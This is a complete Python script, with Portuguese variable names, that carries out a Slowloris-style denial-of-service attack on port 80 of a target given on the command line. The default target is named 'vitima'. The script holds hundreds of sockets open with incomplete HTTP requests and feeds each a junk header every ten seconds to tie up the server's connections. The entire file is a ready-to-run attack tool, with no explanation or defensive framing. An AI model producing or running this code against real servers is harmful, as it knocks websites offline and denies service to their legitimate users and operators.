import socket
import sys
import time

alvo = sys.argv[1] if len(sys.argv) > 1 else "vitima"
conexoes = int(sys.argv[2]) if len(sys.argv) > 2 else 300
duracao = int(sys.argv[3]) if len(sys.argv) > 3 else 60
porta = 80


def abrir_conexao():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((alvo, porta))
    s.send(b"GET / HTTP/1.1\r\n")
    s.send(b"Host: " + alvo.encode() + b"\r\n")
    return s


sockets = []
for _ in range(conexoes):
    try:
        sockets.append(abrir_conexao())
    except OSError:
        pass

fim = time.time() + duracao
while time.time() < fim:
    for s in list(sockets):
        try:
            s.send(b"X-a: b\r\n")
        except OSError:
            sockets.remove(s)
    while len(sockets) < conexoes:
        try:
            sockets.append(abrir_conexao())
        except OSError:
            break
    time.sleep(10)

for s in sockets:
    s.close()
